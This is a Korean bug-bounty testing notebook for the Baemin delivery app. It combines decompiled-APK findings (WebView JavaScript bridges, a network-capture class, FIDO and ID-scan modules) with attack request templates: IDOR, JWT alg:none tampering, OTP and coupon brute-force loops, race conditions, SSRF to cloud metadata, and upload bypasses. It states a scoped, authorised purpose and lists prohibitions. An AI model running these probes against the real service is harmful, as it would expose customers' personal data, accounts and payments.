# 테스트 기법 모음 — 배달의민족 버그바운티

배달앱에서 **실제로 발견될 가능성이 높은** 공격 벡터들. 일반적인 OWASP 방어는 대부분 적용되어 있으므로, 비즈니스 로직과 권한 제어 경계에 초점.

---

## 🎯 Priority 0 — APK 정적분석 기반 실제 타겟 (최우선, 소스코드로 확인됨)

> 2026-09-07, `Baemin - Food Delivery_16.21.0_APKPure.xapk`(다운로드 폴더)를 jadx로 디컴파일해 실제 코드에서 확인한 내용.
> 아래는 추측이 아니라 **실제 클래스/메서드가 존재함을 소스로 확인**한 항목이라 다음 주 세션에서 가장 먼저 검증할 것.
> 단, 여기서도 dynamic 테스트(Frida/mitmproxy 등)는 파인더갭 스코프 승인 + 본인 소유 테스트 계정/기기에서만 진행.

### 테스트 순서 (2026-09-07 확정)

| 순서 | 항목 | 이유 |
|---|---|---|
| 1 | 딥링크 스킴 파싱 | 가장 가벼움(adb만으로 테스트 가능). 웹뷰 오픈 파라미터를 찾으면 2번으로 바로 연결됨 — 정찰 겸 워밍업 |
| 2 | WebView JS Bridge 오리진 검증 | Priority 0 중 임팩트 최대(연락처/위치/FIDO 브릿지 노출), 증거도 가장 확실함. 뚫리면 4번도 같이 검증 가능 |
| 3 | 임베디드 네트워크 캡처 서버 | 공개 유출 경로는 OSINT로 막힘 확인됨 → 프로덕션 빌드 자체를 Frida로 찔러보는 단계. 성공 시 토큰 유출급 임팩트 |
| 4 | FIDO 브릿지 결과 위조 | 2번(WebView 브릿지)이 뚫려야 실제로 도달 가능한 경로라 그 다음 순서 |
| 5 | AML/KYC 신분증 OCR | 가장 민감(실제 신분증 데이터) + 접근 경로 불확실 + 금지행동 경계에 가장 가까워 신중하게 마지막 |

---

### 1순위 — 딥링크 스킴 파싱 모듈

**소스 근거**: `com/baemin/appscheme/deeplink/DeeplinkParseException.java` — 전용 딥링크 파서 패키지가 실제로 존재함을 확인.

기존 1️⃣9️⃣ 섹션의 "커스텀 URL 스킴 인젝션" 시나리오가 추측이 아니라 실제 구현이 있는 코드 경로임이 확인됨. `com.baemin.appscheme` 패키지 전체를 대상으로 malformed/파라미터 인젝션된 딥링크를 시도할 것. **특히 웹뷰를 여는 파라미터(예: `baemin://webview?url=...` 류)가 있는지 확인 — 있다면 2순위(WebView JS Bridge)와 바로 체이닝 가능.**

---

### 2순위 — WebView JavaScript Bridge — 오리진 검증 우회

**소스 근거**
```
com/baemin/shared/web/base/presentation/base/BaseWebFragment.java (~1029-1077줄)
  defaultWebView.addJavascriptInterface(..., "JavaScriptInterface")
  defaultWebView.addJavascriptInterface(..., "CommerceJavaScriptInterface")
  defaultWebView.addJavascriptInterface(..., "BaeminFIDOJavaScriptInterface")
  defaultWebView.addJavascriptInterface(..., "GeolocationJavaScriptInterface")
  defaultWebView.addJavascriptInterface(..., "ContactsJavaScriptInterface")

com/baemin/webview/ui/base/CoreWebFragment.java (~863줄)
  Map<String, Object> 순회하며 동적으로 addJavascriptInterface 호출
```

**왜 위험한가**: `ContactsJavaScriptInterface`, `GeolocationJavaScriptInterface`, `BaeminFIDOJavaScriptInterface`가 실존한다 — 즉 WebView 안의 JS가 연락처, 위치, 생체인증 결과에 접근 가능한 네이티브 브릿지가 붙어 있다는 뜻. 이 브릿지가 **baemin.com 오리진에서만 로드된 페이지에서만 붙는지, 아니면 WebView에 로드되는 모든 URL에 무조건 붙는지**가 핵심 질문.

**테스트 계획**
1. Frida/objection으로 `addJavascriptInterface` 호출 시점과 그 시점의 WebView 로드 URL을 hook해서 로깅
2. 앱 내에서 사용자가 URL을 어느 정도 통제할 수 있는 WebView 진입점을 찾기 (이벤트/배너 웹뷰, CS 문의, 딥링크 파라미터로 여는 웹뷰 등 — 1순위에서 찾은 딥링크 파라미터 활용)
3. 그런 URL이 있다면: 오픈리다이렉트 체이닝 또는 서버가 응답하는 컨텐츠(배너/이벤트 HTML) 조작 가능 지점을 통해 외부 오리진 페이지를 그 웹뷰에 로드
4. 브릿지가 여전히 붙어있다면 `window.ContactsJavaScriptInterface.xxx()`, `window.GeolocationJavaScriptInterface.xxx()` 등을 호출해 연락처/위치/FIDO 결과 조작 시도

**성공 기준**: 비-baemin 오리진 페이지에서 Contacts/Geolocation/FIDO 브릿지 메서드 호출 성공

---

### 3순위 — 임베디드 네트워크 캡처 서버 — 토큰/PII 유출 가능성

**소스 근거**
```
com/baemin/embeddedserver/util/NetworkCapture.java
  - MAX_LOGS = 500, MAX_TOTAL_BYTES = 32MB
  - NetworkLog에 requestHeaders, requestBody, responseHeaders, responseBody 전부 저장
  - isCbtBuild() (570-576줄):
      cachedPackageName에 "cbt" 문자열이 포함되어 있으면(대소문자 무관) true
      → 즉 컴파일타임 BuildConfig.DEBUG가 아니라 "패키지명에 cbt가 들어있는지"라는
        빈약한 클라이언트 사이드 문자열 체크로 캡처 활성화 여부를 결정
```

**왜 위험한가**: 이 클래스가 존재한다는 것 자체가, 요청/응답 헤더(Authorization 토큰 포함 가능성) + 바디(주문/주소/결제 PII 포함 가능성) 전체를 메모리에 버퍼링하는 기능이 앱에 내장돼 있다는 뜻. 활성화 조건이 "패키지명 문자열에 cbt 포함"이라는 매우 약한 기준이라 다음이 성립하면 실제 익스플로잇 가능:
- CBT(비공개 베타) 빌드가 APKPure류 사이트에 잘못 유출/색인된 경우 (실제로 이번에 받은 파일도 서드파티 사이트에서 받은 것)
- 캡처 서버가 로컬 포트를 열어 다른 앱이나 adb에서 접근 가능한 경우

> **2026-09-07 OSINT 확인 결과**: 분석 대상 APK(16.21.0)의 실제 applicationId는 `com.sampleapp`("cbt" 미포함, 라이더 앱은 `com.baemin.driver`). APKPure/Aptoide/MEmu/BigNox 등 주요 미러 사이트 전체를 검색해도 "cbt"가 포함된 별도 패키지명/클로즈드 베타 빌드는 색인되어 있지 않음 → **공개 경로로 CBT 빌드를 구해서 캡처를 활성화시키는 시나리오는 현재로선 막힘**. 따라서 아래 테스트 계획은 1~2번(공개 유출 확인)을 건너뛰고 3번부터 시작할 것.

**테스트 계획**
1. ~~분석 대상 APK의 실제 applicationId 확인~~ → 완료: `com.sampleapp`, "cbt" 미포함
2. ~~CBT 플레이버 APK가 공개적으로 구할 수 있는 경로가 있는지 확인~~ → 완료: 미발견 (위 OSINT 결과 참고)
3. 프로덕션 빌드(`com.sampleapp`)를 설치한 채로 `adb shell netstat` / 로컬 포트 스캔으로 이 서버가 그래도 리스닝 중인지, `getAllSummaries()`/`get(id)` 형태의 엔드포인트가 로컬에서 응답하는지 확인 (캡처가 꺼져 있어도 서버 자체는 떠 있을 수 있음)
4. Frida로 `NetworkCapture.add()` / `isCbtBuild()`를 훅해서, 프로덕션 빌드에서 실제로 항상 false인지, 혹은 숨겨진 개발자 메뉴(버전 여러 번 탭 등)나 다른 원격 플래그(Remote Config 등)로 우회 가능한지 확인 — 이게 이제 이 항목의 핵심 검증 지점
5. 접근 가능하다면 캡처된 로그에서 `Authorization` 헤더/세션 토큰/개인정보 추출 시도

**성공 기준**: 캡처된 로그에서 실제 인증 토큰 또는 타 세션의 PII 획득

---

### 4순위 — FIDO 생체인증 브릿지 — 결과 위조

**소스 근거**: `com/baemin/fido/BaeminFidoFileValidator.java`, `BaeminFidoResult`, `BaeminFidoStatus`

**가설**: `BaeminFIDOJavaScriptInterface`(2순위)를 통해 WebView 쪽 JS가 FIDO 인증 결과를 네이티브로 전달하는 구조로 보임. 실제 생체인증을 거치지 않고 "성공" 상태값만 조작해서 넘기면 인증을 우회할 수 있는지 확인 필요 (성공/실패 판단 로직이 클라이언트 상태값에 의존하는지, 서버 챌린지-응답 검증이 있는지가 핵심). **2순위에서 WebView 브릿지 접근이 확인된 뒤 진행.**

**테스트 계획**: `BaeminFidoResult`/`BaeminFidoStatus`의 필드를 Frida로 후킹해 결과값을 강제로 성공(success)으로 바꿔서 이후 흐름(예: 간편결제, 비밀번호 없는 로그인)이 인증 없이 진행되는지 확인.

---

### 5순위 — AML/KYC 신분증 OCR 모듈

**소스 근거**: `com/baemin/aml/presentation/edd/ocr/ui/EddOcrActivity.java` ("EDD" = Enhanced Due Diligence, 자금세탁방지 규정상 신분증 스캔)

**왜 중요한가**: 신분증 이미지 + OCR 파싱 결과(주민등록번호 등 초민감 개인정보)를 다루는 화면이 실제로 존재. 라이더/사장님 등록이나 배민페이 계열 KYC 흐름에서 쓰일 가능성. **가장 민감한 데이터를 다루고 접근 경로(가입 플로우)도 불확실해서 맨 마지막에, 신중하게 진행.**

**테스트 계획**
- 캡처된 신분증 이미지가 기기 로컬(외부 저장소/캐시)에 암호화 없이 남는지 확인 (다른 앱이 스토리지 권한으로 접근 가능한 경로인지)
- "신분증 제출/검증" API에 예측 가능한 verification_id가 있어 IDOR로 타인의 제출 상태·이미지 조회가 가능한지 확인
- OCR 결과값(이름/주민번호 등)이 클라이언트에서 서버로 그대로 전송되는지, 전송 채널이 TLS인지

**주의**: 본인 명의가 아닌 실제 타인의 신분증 데이터에 접근 시도는 금지 대상(계정 탈취/PII 침해)에 해당 — 반드시 본인 테스트 계정/더미 데이터로만.

---

### 참고 (우선순위 없음) — 서드파티 SDK 부착 현황

소스에서 실제로 확인된 SDK 목록 — 우선순위는 낮지만 테스트 시 인지해야 함:

- **Kakao SDK / Naver SDK**(`com.navercorp.nid`) — 소셜 로그인 OAuth 연동, 계정 연동 취약점 가능성
- **Sendbird** — 인앱 채팅(문의/배달 채팅). 채팅방 접근 통제(IDOR) 확인 대상
- **Braze** — 마케팅/푸시 SDK. PII가 서드파티로 얼마나 넘어가는지 확인
- **crosscert** — 국내 공인인증/전자서명 관련. PASS 등 본인인증 연동부 확인
- **scottyab/rootbeer** — 루팅 탐지 로직 존재. 동적 테스트 시 탐지 우회(Magisk DenyList, Frida 은닉) 준비 필요
- **xshield** — 앱 변조방지/난독화 SDK 존재. 정적 분석 시 일부 클래스가 추가로 암호화/난독화돼 jadx로 안 풀릴 수 있음

---

## 🎯 Priority 1 — 가장 많이 나오는 취약점

### 1️⃣ IDOR (권한 없는 객체 접근)

**왜 중요**: 배달앱에서 가장 많이 발견되는 취약점. ID만 바꾸면 남의 데이터가 보인다.

#### 테스트 대상 및 기법

**주문 데이터**
```bash
# 당신의 주문 조회
GET /api/orders/my
→ 응답: {"order_id": 98765, "user_id": 12345, ...}

# 다른 사용자 주문 조회 시도
GET /api/orders/98764
GET /api/orders/98766
GET /api/orders/98700
→ 다른 사용자의 전체 주문 내역 노출?

# 또는 user_id로 직접 조회
GET /api/users/12346/orders  (다른 사용자 ID)
```

**배송 주소**
```bash
GET /api/users/12345/addresses
→ 자신의 주소 (성공)

GET /api/users/12346/addresses
→ 다른 사용자의 주소(들) + 전화번호 노출?
```

**리뷰/평가**
```bash
GET /api/reviews/123
→ 리뷰 작성자의 배송 주소, 전화번호 같은 개인정보 포함?
```

**쿠폰 상태**
```bash
GET /api/coupons/user/12345
→ 보유한 쿠폰 코드, 만료일, 사용 여부 조회 가능?

GET /api/coupons/user/12346/active
→ 다른 사용자의 유효한 쿠폰 목록 조회?
```

**결제 정보**
```bash
GET /api/orders/98765/payment
→ 카드 마지막 4자리, 결제 금액, 결제 시간 등 민감정보 노출?
```

#### 성공 기준
- ✅ 다른 사용자의 배송 주소 조회
- ✅ 다른 사용자의 주문 내역 조회
- ✅ 다른 사용자의 결제 정보 조회
- ✅ 다른 사용자의 쿠폰/포인트 정보 조회
- ✅ 리뷰에서 타인의 전화번호/주소 노출

**금지**: 데이터 수정/삭제 ❌

---

### 2️⃣ 수평적 권한 상승 (Horizontal Privilege Escalation)

**개념**: 같은 역할(고객) 내에서 다른 사용자의 리소스 수정/삭제

#### 테스트 기법

**다른 사용자의 배송 주소 수정**
```bash
# 자신의 주소 수정 (성공)
PUT /api/users/12345/addresses/1
{"address": "새 주소"}

# 다른 사용자의 주소 수정 시도
PUT /api/users/12346/addresses/1
{"address": "해킹된 주소"}
→ 다른 사용자의 배송지가 변경될까?
```

**다른 사용자의 주문 취소**
```bash
# 자신의 주문 취소 (성공)
POST /api/orders/98765/cancel

# 다른 사용자의 주문 취소 시도
POST /api/orders/98764/cancel
→ 배달이 시작된 타인 주문을 취소할 수 있을까?
```

**다른 사용자의 리뷰 수정/삭제**
```bash
PUT /api/reviews/review_123
{"rating": 5, "comment": "다시 작성함"}
→ 다른 사용자의 리뷰를 수정할 수 있을까?
```

**다른 사용자의 프로필 정보 수정**
```bash
PUT /api/users/12346/profile
{"name": "해킹된 이름", "phone": "다른번호"}
```

#### 성공 기준
- ✅ 타인의 배송지 변경 가능
- ✅ 타인의 주문 취소/변경 가능
- ✅ 타인의 리뷰 수정/삭제 가능

---

### 3️⃣ 수직적 권한 상승 (Vertical Privilege Escalation)

**개념**: 일반 사용자가 고급 역할(사장님/라이더/관리자) API 호출 가능

#### 테스트 기법

**일반 사용자로 음식점 관리 API 호출**
```bash
# 음식점 사장님만 가능해야 함
POST /api/restaurants/123/menu
{"item_name": "메뉴 추가", "price": 10000}
→ 아무 음식점의 메뉴를 추가할 수 있을까?

PUT /api/restaurants/123/settings
{"opening_hours": "11:00-23:00"}

DELETE /api/restaurants/123/menu/456
```

**일반 사용자로 배달원 관리 API 호출**
```bash
GET /api/riders/list
POST /api/riders/assign
{"order_id": 98765, "rider_id": 555}
```

**일반 사용자로 관리자 API 호출**
```bash
GET /api/admin/users
GET /api/admin/analytics
POST /api/admin/promotions
POST /api/admin/ban-user
{"user_id": 12346}
```

**토큰의 role/permission 변조 (JWT)**
```bash
# 획득한 토큰 디코딩
eyJhbGc...

# 페이로드가 다음과 같다면:
{"user_id": 12345, "role": "customer", "permissions": ["view_orders"]}

# role을 변조
{"user_id": 12345, "role": "admin", "permissions": ["admin_access"]}

# 재 인코딩 후 사용
→ 서버가 검증하지 않으면 관리자로 접근 가능
```

#### 성공 기준
- ✅ 일반 사용자가 음식점 메뉴 수정/추가
- ✅ 일반 사용자가 배달원 배정 변경
- ✅ 일반 사용자가 관리자 API 접근
- ✅ JWT role 변조로 권한 상승

---

### 4️⃣ 역할 간 경계 붕괴 (Cross-Role API Access)

**개념**: 고객 앱 토큰으로 라이더/사장님 API를, 라이더 토큰으로 사장님 API를 호출

#### 테스트 기법

**고객 토큰으로 라이더 API 호출**
```bash
# 고객 로그인 후 토큰 획득
Authorization: Bearer customer_token_xyz

# 라이더 전용 API 시도
GET /api/rider/deliveries
→ 배달 중인 주문 목록 조회 가능?

POST /api/rider/delivery/98765/complete
→ 주문을 배달 완료 처리 가능?
```

**라이더 토큰으로 사장님 API 호출**
```bash
# 라이더 로그인 후 토큰 획득
Authorization: Bearer rider_token_abc

# 사장님 전용 API 시도
GET /api/restaurant/123/orders
POST /api/restaurant/123/menu
```

**고객 토큰으로 사장님 API 호출**
```bash
GET /api/restaurant/settings
PUT /api/restaurant/123/analytics
```

#### 성공 기준
- ✅ 토큰 타입 검증 부재
- ✅ 역할별 API 경로가 명확하지 않음

---

## 🎯 Priority 2 — 비즈니스 로직 결함

### 5️⃣ 쿠폰/프로모션 로직 우회

**쿠폰 중복 적용**
```bash
POST /api/orders/create
{
  "items": [...],
  "coupons": ["SAVE10", "SAVE10"]  # 같은 쿠폰 2번
}
→ 할인이 2배 적용될까?
```

**만료된 쿠폰 재사용**
```bash
# 만료된 쿠폰 코드로 결제
POST /api/orders/checkout
{"coupon_code": "EXPIRED2023"}
→ 만료된 것도 적용될까?
```

**최소 주문금액 우회**
```bash
# 프로모션: 최소 20,000원 이상 주문 시 배송료 무료

POST /api/orders/create
{
  "items": [{"id": 123, "quantity": 1, "price": 5000}],  # 5,000원
  "delivery_fee": 0,  # 클라이언트에서 0으로 설정
  "total_price": 5000
}
→ 서버가 재검증하지 않으면 무료배달 적용?
```

**쿠폰 발급 API 반복 호출**
```bash
# 매일 1회 한정 쿠폰 API
POST /api/coupons/daily-coupon
→ Rate limit가 없으면 무한 발급?

# 또는 쿠폰 코드 패턴 예측
POST /api/coupons/issue?code=WELCOME0001
POST /api/coupons/issue?code=WELCOME0002
→ 시퀀셜 코드로 무제한 쿠폰 생성?
```

**쿠폰 코드 브루트포스**
```bash
# 쿠폰 코드가 4자리 숫자면
for i in {0000..9999}
  POST /api/coupons/validate {"code": $i}
→ 유효한 쿠폰 코드 발견?
```

---

### 6️⃣ 가격/결제 조작

**클라이언트 가격 계산 신뢰**
```bash
POST /api/orders/create
{
  "items": [
    {"id": 456, "name": "짜장면", "price": 5000, "quantity": 2}
  ],
  "subtotal": 10000,
  "delivery_fee": 2000,
  "discount": 5000,
  "total_price": 7000  # 클라이언트에서 계산
}

# 결제 전 서버가 재계산하지 않으면?
→ total_price를 100으로 변조해서 결제?
```

**배송료 조작**
```bash
POST /api/orders/create
{
  "delivery_fee": 0  # 또는 음수
}
→ 배송료를 무료로 만들 수 있을까?
```

**이미 결제된 주문 재결제**
```bash
POST /api/payments/retry
{"order_id": 98765}  # 이미 결제 완료된 주문

→ 중복 결제될까? 환불되지 않을까?
```

---

### 7️⃣ 레이스 컨디션 (Race Condition)

**쿠폰 중복 사용 (동시 요청)**
```bash
# 쿠폰: 1회 한정

# 동시에 2개 주문 생성
curl -X POST /api/orders/create \
  -d '{"coupon": "SAVE20"}' &
curl -X POST /api/orders/create \
  -d '{"coupon": "SAVE20"}' &

→ 동시에 같은 쿠폰으로 2개 주문 체크아웃?
```

**포인트 중복 사용**
```bash
# 포인트: 10,000점 보유

# 동시에 2개 주문
curl POST /api/orders/create {"points_used": 10000} &
curl POST /api/orders/create {"points_used": 10000} &

→ 20,000점 차감되지만 10,000점만 있을 때?
```

**한정 프로모션 중복 참여**
```bash
# 프로모션: 첫 100명만 50% 할인

# 동시에 여러 주문 생성
→ 101번째도 할인 받을 수 있을까?
```

**재고 초과 주문**
```bash
# 상품: 1개만 남음

curl POST /api/orders/create {"item": 123, "qty": 1} &
curl POST /api/orders/create {"item": 123, "qty": 1} &

→ 둘 다 주문 성공할까?
```

---

### 8️⃣ 무료배달/최소주문 조건 우회

**조건 검증이 클라이언트만 수행**
```bash
# 프로모션: 30,000원 이상 배송료 무료

# 클라이언트 JS에서 확인 후 무료 표시
# 서버는 재검증 없음

POST /api/orders/checkout
{
  "subtotal": 15000,
  "delivery_fee": 0  # 클라이언트에서 0으로 설정
}
→ 서버가 accept?
```

**파라미터 조작으로 조건 회피**
```bash
POST /api/orders/create
{
  "order_type": "pre_order",  # 최소금액 미적용
  "delivery_fee": 0
}
```

---

### 9️⃣ 포인트/적립금/리퍼럴 어뷰징

**자기 자신을 추천**
```bash
# 첫 주문 후 친구 추천 이벤트: 3,000포인트 적립

POST /api/referral/invite
{
  "invitee_phone": "내 폰번호",
  "invitee_email": "내 이메일"
}

→ 조건 검증이 없으면 자신을 추천?
```

**음수 값으로 포인트 증가**
```bash
PUT /api/points/use
{
  "amount": -10000  # 음수
}

→ 포인트가 10,000 증가할까?
```

**포인트 환불 후 재사용**
```bash
1. 포인트로 결제
2. 주문 취소
3. 포인트 환불
4. 같은 주문번호로 다시 결제
→ 포인트 중복 사용?
```

**리퍼럴 무한 루프**
```bash
# A가 B를 추천 (A는 고객, B는 신규)
# B가 A를 다시 추천?

→ 무한 포인트 적립?
```

---

## 🎯 Priority 3 — 인증/토큰 결함

### 🔟 인증 로직 결함

**OTP/인증번호 무제한 시도**
```bash
# SMS OTP 전송
POST /api/auth/send-otp
{"phone": "010-1234-5678"}

# 6자리 숫자 브루트포스 (rate limit 없음)
for i in {000000..999999}
  POST /api/auth/verify-otp {"otp": $i}
```

**OTP 응답값에 정답 노출**
```bash
POST /api/auth/send-otp
{"phone": "010-1234-5678"}

응답:
{
  "otp_id": "12345",
  "status": "pending",
  "otp": "123456"  # ← 정답이 노출!
}
```

**상태값만 바꾸면 OTP 우회**
```bash
POST /api/auth/send-otp
{"phone": "010-1234-5678"}

응답:
{
  "otp_session": "sess_xyz",
  "verified": false
}

# verified를 true로 바꾸면?
POST /api/auth/verify-otp
{
  "otp_session": "sess_xyz",
  "verified": true  # 수동 변조
}
→ OTP 없이 인증?
```

**세션 고정 (Session Fixation)**
```bash
# 공격자가 생성한 세션 ID
session_id = "attacker_session_123"

# 사용자에게 링크 전달
https://baemin.com/login?session_id=attacker_session_123

# 사용자가 로그인
→ 공격자는 같은 session_id로 접근 가능?
```

---

### 1️⃣1️⃣ JWT/토큰 취약점

**알고리즘 변조 (alg: none)**
```bash
# 원본 토큰
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyX2lkIjogIjEyMzQ1In0.
signature

# alg를 none으로 변조
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.
eyJ1c2VyX2lkIjogIjk5OTk5In0.
(서명 제거)

→ 서버가 검증하지 않으면 admin으로 로그인?
```

**서명 검증 누락**
```bash
# 토큰 페이로드 변조
{"user_id": 12345, "role": "customer"}

→

{"user_id": 12345, "role": "admin"}

# 재 인코딩 후 사용 (서명 변조도 필요없음)
→ 서버가 서명을 검증하지 않으면 작동?
```

**만료 시간 제거**
```bash
# 정상 토큰
{
  "user_id": 12345,
  "exp": 1234567890  # 2024년 만료
}

# exp 필드 제거
{
  "user_id": 12345
}

→ 토큰이 영구적으로 유효?
```

**Refresh Token 탈취 후 장기간 사용**
```bash
# 공격자가 Refresh Token을 탈취
refresh_token = "eyJhbGc..."

# 몇 개월 후에도 사용 가능?
POST /api/auth/refresh
{"refresh_token": refresh_token}

→ 로그아웃 후에도 재발급 가능?
```

---

### 1️⃣2️⃣ Mass Assignment (과도한 필드 할당)

**회원가입에 admin 필드 추가**
```bash
POST /api/auth/register
{
  "name": "attacker",
  "email": "attacker@example.com",
  "password": "123456",
  "is_admin": true,  # ← 추가로 삽입
  "verified": true
}

→ 가입한 계정이 관리자로 생성될까?
```

**프로필 수정에서 role 변조**
```bash
PUT /api/users/12345/profile
{
  "name": "New Name",
  "role": "restaurant_owner",  # ← 추가로 삽입
  "verified_badge": true
}
```

**주문 생성 시 user_id 변조**
```bash
POST /api/orders/create
{
  "restaurant_id": 123,
  "user_id": 99999,  # ← 다른 사용자로 변조
  "items": [...]
}

→ 다른 사용자 명의로 주문?
```

---

## 🎯 Priority 4 — 시스템 레벨 결함

### 1️⃣3️⃣ Rate Limiting 부재

**무제한 로그인 시도**
```bash
for i in {1..1000}
  POST /api/auth/login {"email": "user@example.com", "password": "random$i"}
→ 계정 잠금 없음? 무제한 brute force?
```

**무제한 쿠폰 검증**
```bash
for code in (4자리 숫자 0000-9999)
  POST /api/coupons/validate {"code": $code}
→ 모든 유효한 쿠폰 코드 찾기?
```

**무제한 리뷰 작성**
```bash
for i in {1..10000}
  POST /api/reviews/create {"order_id": 98765, "rating": 5}
→ 같은 주문에 수천 개 리뷰?
```

---

### 1️⃣4️⃣ SSRF (Server-Side Request Forgery)

**이미지 업로드에서 내부망 접근**
```bash
PUT /api/users/profile/avatar
{
  "image_url": "http://127.0.0.1:8080/admin"  # 내부 URL
}

→ 서버가 이 URL을 fetch하면서 내부망 노출?
```

**URL 미리보기 기능**
```bash
POST /api/link-preview
{
  "url": "http://internal.baemin.com/admin"
}

→ 미리보기 생성 중에 내부망 정보 반환?
```

**웹훅 등록**
```bash
POST /api/webhooks/register
{
  "callback_url": "http://169.254.169.254/latest/meta-data"  # AWS 메타데이터
}
```

---

### 1️⃣5️⃣ 파일 업로드 취약점

**확장자 검증 우회**
```bash
# jpg만 허용하지만
image.jpg.php  # 업로드되면 PHP 실행?
image.jpg%00.php  # Null byte로 우회?
image.php.jpg  # 역순?
```

**MIME 타입 위조**
```bash
# 실제로는 PHP 파일이지만
Content-Type: image/jpeg

POST /api/restaurants/menu/upload
→ 서버가 확장자만 체크하고 content-type은 무시?
```

**경로 조작 (Path Traversal)**
```bash
POST /api/upload
{
  "file": "menu.jpg",
  "save_path": "../../admin/config.jpg"  # 다른 경로에 저장?
}
```

---

### 1️⃣6️⃣ 정보 노출 (Information Disclosure)

**에러 메시지에 스택 트레이스 노출**
```bash
GET /api/orders/abc

응답 500:
{
  "error": "TypeError: Cannot read property 'user_id' of undefined",
  "stack": "at Function.getOrder (/app/src/api.js:123:45)",
  "database": "postgres://user:pass@localhost/baemin_db"  # ← 노출!
}
```

**디버그/스테이징 엔드포인트 방치**
```bash
GET /api/debug/users
GET /api/staging/admin
GET /internal/metrics
→ 실서버에 노출?
```

**CORS 와일드카드 설정**
```
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

**응답에 불필요한 개인정보**
```bash
GET /api/orders/98765

응답:
{
  "order_id": 98765,
  "customer": {
    "id": 12345,
    "name": "김철수",
    "phone": "010-1234-5678",  # ← 왜 노출?
    "address": "서울시 강남구...",  # ← 왜 노출?
    "ssn": "960101-1234567"  # ← 왜 노출???
  }
}
```

**API 버전 정보/기술 스택 노출**
```bash
curl -I https://baemin.com

Server: nginx/1.19.0
X-Powered-By: Express/4.17.1
X-API-Version: v2.3.1
```

---

### 1️⃣7️⃣ 위치/GPS 조작 (Location Spoofing)

**라이더의 위치 스푸핑**
```bash
PUT /api/delivery/98765/location
{
  "latitude": 37.4979,
  "longitude": 127.0276,
  "timestamp": 1234567890
}

→ 서버가 실제 GPS와 비교 검증하지 않으면?
   - 배차 조작
   - 배달 완료 사기
```

**고객의 주소 검증 우회**
```bash
POST /api/orders/create
{
  "delivery_address": "서울시 강남구",
  "delivery_zone": "Seoul"  # 시스템에서 계산하지 않음
}
```

---

### 1️⃣8️⃣ 모바일 앱 정적 분석 (APK Reverse Engineering)

**APK 디컴파일 후 발견 가능한 것들**
```
- 하드코딩된 API 키/시크릿
- 백엔드 API URL (스테이징 포함)
- 내부 엔드포인트
- 암호화 키
- 디버그 플래그 (debuggable=true)
- 테스트 계정 정보
```

---

### 1️⃣9️⃣ WebView/딥링크 취약점

**JavaScript 브릿지 과다 노출**
```javascript
// 앱의 WebView
addJavascriptInterface(jsBridge, "Android");

// 웹페이지에서
window.Android.getUserData()  // 모든 데이터 접근?
window.Android.makePayment()  // 결제 API 호출?
```

**커스텀 URL 스킴 인젝션**
```
baemin://order/create?restaurant_id=123&price=0
baemin://payment/complete?status=success&order_id=98765
baemin://admin/login?user_id=99999
```

---

## 📝 테스트 로깅 포맷

```markdown
### Control: TEST-XXX-[취약점명]

**기법**: [기법명]
**대상**: [엔드포인트]
**테스트 내용**: [구체적 시도]
**명령어**: [curl/스크립트]
**결과**: [성공/실패/부분성공]

**FACT** (관찰된 것):
- Status Code: 
- Response:
- 에러 메시지:

**INFERENCE** (해석):
- 이것이 취약점인 이유:
- 공격 시나리오:
- 영향도:

**금지 사항 준수**: ✅/❌
```

---

**⚠️ 절대 금지**
- ❌ 실제 결제/환불 진행
- ❌ 데이터 수정/삭제 (배송주소 변경, 주문 취소 포함)
- ❌ 다른 사용자 계정 탈취
- ❌ 웹셸 업로드
- ❌ DoS/자동화 무한 요청
